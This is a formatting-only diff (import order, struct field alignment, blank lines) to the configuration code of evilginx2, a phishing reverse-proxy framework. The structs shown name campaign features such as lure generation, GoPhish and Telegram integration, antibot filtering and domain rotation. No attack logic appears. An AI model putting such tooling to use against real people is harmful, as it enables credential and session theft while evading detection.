@@ -7,10 +7,10 @@ import (
 	"path/filepath"
 	"strings"
 
-	"github.com/kgretzky/evilginx2/log"
 	"github.com/kgretzky/evilginx2/core/antibot/infra"
 	"github.com/kgretzky/evilginx2/core/antibot/response"
 	"github.com/kgretzky/evilginx2/core/antibot/signals"
+	"github.com/kgretzky/evilginx2/log"
 
 	"github.com/spf13/viper"
 )
@@ -68,10 +68,10 @@ type CertificatesConfig struct {
 }
 
 type GoPhishConfig struct {
-	AdminUrl               string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
-	ApiKey                 string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
-	InsecureTLS            bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
-	IntegratedAdminUrl     string `mapstructure:"integrated_admin_url" json:"integrated_admin_url" yaml:"integrated_admin_url"`
+	AdminUrl           string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
+	ApiKey             string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
+	InsecureTLS        bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
+	IntegratedAdminUrl string `mapstructure:"integrated_admin_url" json:"integrated_admin_url" yaml:"integrated_admin_url"`
 }
 
 type TelegramConfig struct {
@@ -121,17 +121,17 @@ type LureGenerationConfig struct {
 }
 
 type GeneralConfig struct {
-	OldIpv4          string       `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4     string       `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4         string       `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl        string       `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpPort         int          `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
-	HttpsPort        int          `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort          int          `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
-	Autocert         bool         `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
-	TrustedProxies   []string     `mapstructure:"trusted_proxies" json:"trusted_proxies" yaml:"trusted_proxies"`
-	ServerCookieName string       `mapstructure:"server_cookie_name" json:"server_cookie_name" yaml:"server_cookie_name"`
-	WebAdminPort     int          `mapstructure:"web_admin_port" json:"web_admin_port" yaml:"web_admin_port"`
+	OldIpv4          string   `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4     string   `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4         string   `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl        string   `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpPort         int      `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
+	HttpsPort        int      `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort          int      `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert         bool     `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	TrustedProxies   []string `mapstructure:"trusted_proxies" json:"trusted_proxies" yaml:"trusted_proxies"`
+	ServerCookieName string   `mapstructure:"server_cookie_name" json:"server_cookie_name" yaml:"server_cookie_name"`
+	WebAdminPort     int      `mapstructure:"web_admin_port" json:"web_admin_port" yaml:"web_admin_port"`
 }
 
 type Config struct {
@@ -314,7 +314,6 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 
 	// Initialize unified DomainManager
 	c.domainManager = NewDomainManager(c.cfg)
-
 
 	for i := 0; i < len(c.lures); i++ {
 		c.lureIds = append(c.lureIds, GenRandomToken())
@@ -1251,7 +1250,6 @@ func (c *Config) SetCaptchaRequireForLures(require bool) {
 }
 
 // Domain rotation methods now delegate to DomainManager - see terminal.go
-
 
 func (c *Config) GetTrafficShapingConfig() *signals.TrafficShapingConfig {
 	return c.trafficShapingConfig
